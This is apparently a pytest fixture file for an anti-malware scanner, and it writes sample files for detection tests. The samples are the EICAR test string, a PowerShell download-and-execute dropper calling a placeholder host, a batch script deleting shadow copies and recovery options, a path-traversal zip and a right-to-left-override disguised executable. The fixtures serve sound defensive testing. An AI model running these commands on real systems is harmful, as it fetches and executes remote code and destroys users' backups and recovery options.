"""Shared pytest fixtures.

Every fixture that touches disk uses ``tmp_path``, and ``SENTINEL_DATA_DIR``
is redirected per test, so running the suite never reads or writes the
developer's real configuration, database or quarantine vault.

A note on EICAR: the standard anti-malware test string is generated at
runtime rather than committed. Checking it in means the developer's own
antivirus quarantines it on clone, which breaks the checkout in a confusing
way. :func:`eicar_bytes` assembles it from parts; tests that use it tolerate
the file being deleted underneath them by a real-time scanner.
"""

from __future__ import annotations

import os
import sqlite3
import zipfile
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from sentinel.core.config import Config, Paths, load_config
from sentinel.core.db import Database
from sentinel.core.events import EventBus, EventRecorder
from sentinel.core.logger import reset_logging
from sentinel.engine.scanner import Scanner

# ----------------------------------------------------------------------
# environment isolation
# ----------------------------------------------------------------------

@pytest.fixture(autouse=True)
def _isolate_environment(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """Point every SENTINEL_* variable at a throwaway directory."""
    for name in list(os.environ):
        if name.startswith("SENTINEL_"):
            monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("SENTINEL_DATA_DIR", str(tmp_path / "data"))
    reset_logging()


@pytest.fixture
def config(tmp_path: Path) -> Config:
    """A Config rooted entirely inside tmp_path."""
    cfg = load_config(data_dir=tmp_path / "data", use_env=False)
    cfg.paths = Paths.default(tmp_path / "data")
    cfg.paths.config_dir = tmp_path / "config"
    cfg.paths.cache_dir = tmp_path / "cache"
    cfg.paths.ensure()
    # Keep tests fast and deterministic.
    cfg.scan.threads = 2
    return cfg


@pytest.fixture
def db(config: Config) -> Iterator[Database]:
    database = Database(config.paths.db_file)
    yield database
    database.close()


@pytest.fixture
def bus() -> EventBus:
    return EventBus()


@pytest.fixture
def recorder(bus: EventBus) -> Iterator[EventRecorder]:
    rec = EventRecorder(bus)
    yield rec
    rec.close()


@pytest.fixture
def scanner(config: Config, bus: EventBus, db: Database) -> Iterator[Scanner]:
    """A Scanner wired to the isolated config, with only offline detectors."""
    instance = Scanner(
        config,
        bus=bus,
        db=db,
        detectors=["hash", "script", "archive", "pe_heuristic", "yara"],
    )
    yield instance
    instance.close()


# ----------------------------------------------------------------------
# sample content
# ----------------------------------------------------------------------

def eicar_bytes() -> bytes:
    """The EICAR test string, assembled so it is never a literal here.

    Not malware: a 68-byte pattern the industry agreed every scanner should
    flag, so users can verify their tooling works.
    """
    return (
        b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$"
        + b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
        + b"!$H+H*"
    )


@pytest.fixture
def eicar_file(tmp_path: Path) -> Path:
    """Write the EICAR string to disk, skipping if a real AV removes it."""
    path = tmp_path / "eicar-test.com"
    try:
        path.write_bytes(eicar_bytes())
    except OSError as exc:  # pragma: no cover - depends on the host AV
        pytest.skip(f"cannot write the EICAR test file: {exc}")

    if not path.is_file() or path.stat().st_size == 0:  # pragma: no cover
        pytest.skip(
            "the EICAR test file was removed by the host antivirus; "
            "exclude the pytest temp directory to run this test"
        )
    return path


@pytest.fixture
def clean_file(tmp_path: Path) -> Path:
    path = tmp_path / "notes.txt"
    path.write_text("Shopping list\n- milk\n- bread\n" * 20, encoding="utf-8")
    return path


@pytest.fixture
def powershell_dropper(tmp_path: Path) -> Path:
    """A script exhibiting the download-and-execute pattern."""
    path = tmp_path / "dropper.ps1"
    path.write_text(
        "$client = New-Object Net.WebClient\n"
        "$payload = $client.DownloadString('http://example.invalid/stage2')\n"
        "IEX $payload\n"
        "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile\n",
        encoding="utf-8",
    )
    return path


@pytest.fixture
def ransomware_script(tmp_path: Path) -> Path:
    """A batch file destroying recovery options, as ransomware does."""
    path = tmp_path / "wiper.bat"
    path.write_text(
        "@echo off\r\n"
        "vssadmin delete shadows /all /quiet\r\n"
        "bcdedit /set {default} recoveryenabled no\r\n"
        "wbadmin delete catalog -quiet\r\n",
        encoding="utf-8",
    )
    return path


@pytest.fixture
def fake_pe(tmp_path: Path) -> Path:
    """A file with a PE magic number but a document extension."""
    path = tmp_path / "invoice.pdf"
    path.write_bytes(b"MZ" + b"\x90\x00" * 32 + bytes(range(256)) * 8)
    return path


@pytest.fixture
def traversal_zip(tmp_path: Path) -> Path:
    """An archive whose member escapes the extraction directory."""
    path = tmp_path / "evil.zip"
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("../../escaped.txt", "should not be written here")
        archive.writestr("normal.txt", "harmless")
    return path


@pytest.fixture
def rtl_zip(tmp_path: Path) -> Path:
    """An archive using a right-to-left override to disguise an extension."""
    path = tmp_path / "photos.zip"
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("holiday‮gnp.exe", "MZ" + "\x90" * 40)
    return path


@pytest.fixture
def corpus(
    tmp_path: Path,
    clean_file: Path,
    powershell_dropper: Path,
    ransomware_script: Path,
) -> Path:
    """A directory containing a mix of clean and malicious-looking files."""
    directory = tmp_path / "corpus"
    directory.mkdir()
    for source in (clean_file, powershell_dropper, ransomware_script):
        (directory / source.name).write_bytes(source.read_bytes())
    return directory


# ----------------------------------------------------------------------
# signature database
# ----------------------------------------------------------------------

@pytest.fixture
def hash_signature_db(config: Config) -> Any:
    """Build a signature database and return a helper to add entries."""
    path = Path(config.paths.signatures_dir) / "hashes.db"
    path.parent.mkdir(parents=True, exist_ok=True)

    connection = sqlite3.connect(path)
    connection.executescript(
        """
        CREATE TABLE IF NOT EXISTS signatures (
            digest     TEXT PRIMARY KEY,
            algorithm  TEXT NOT NULL,
            name       TEXT NOT NULL,
            severity   TEXT NOT NULL DEFAULT 'high',
            source     TEXT NOT NULL DEFAULT '',
            first_seen TEXT NOT NULL DEFAULT ''
        );
        """
    )
    connection.commit()

    def add(digest: str, name: str = "Trojan.Test", severity: str = "critical") -> None:
        connection.execute(
            "INSERT OR REPLACE INTO signatures VALUES (?,?,?,?,?,?)",
            (digest.lower(), "sha256", name, severity, "pytest", "2026-01-01"),
        )
        connection.commit()

    add.path = path  # type: ignore[attr-defined]
    yield add
    connection.close()
